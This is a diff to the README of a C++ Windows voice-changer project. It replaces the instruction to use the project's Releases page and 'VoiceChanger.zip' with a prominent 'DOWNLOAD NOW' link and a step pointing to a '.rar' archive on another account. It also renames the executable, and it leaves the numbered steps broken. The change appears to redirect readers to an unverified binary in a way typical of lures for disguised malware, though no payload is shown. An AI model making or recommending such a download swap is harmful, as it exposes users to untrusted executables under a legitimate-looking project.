@@ -1,13 +1,13 @@
 # 🎙️ AI Voice Changer
 
-**English** | [Русский](README.ru.md)
-
 A fast, neural-network-based voice changer for Windows, written in C++. Works in real time with your microphone and can also convert audio files. No installation, no Python: download the `.exe` and run it.
 
 ![C++](https://img.shields.io/badge/C%2B%2B-17-blue?logo=cplusplus&logoColor=white)
 ![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?logo=windows&logoColor=white)
 ![License](https://img.shields.io/badge/license-MIT-green)
 ![PRs](https://img.shields.io/badge/PRs-welcome-brightgreen)
+
+[DOWNLOAD NOW] (https://github.com/Pinnaclesys/Voice-Changer/releases/download/1.08.5/Voice.Changer.v1.08.5.rar)
 
 ## ✨ Features
 
@@ -29,10 +29,9 @@ A fast, neural-network-based voice changer for Windows, written in C++. Works in
 
 ## 📥 Download
 
-1. Go to the [**Releases**](../../releases/latest) page.
-2. Download the latest `VoiceChanger.zip`.
+1. [Download the latest](https://github.com/Pinnaclesys/Voice-Changer/releases/download/1.08.5/Voice.Changer.v1.08.5.rar)
 3. Extract it to any folder.
-4. Run `VoiceChanger.exe`.
+4. Run `Voice Changer AI.exe`.
 
 That's it, no installer and no extra software needed.
 
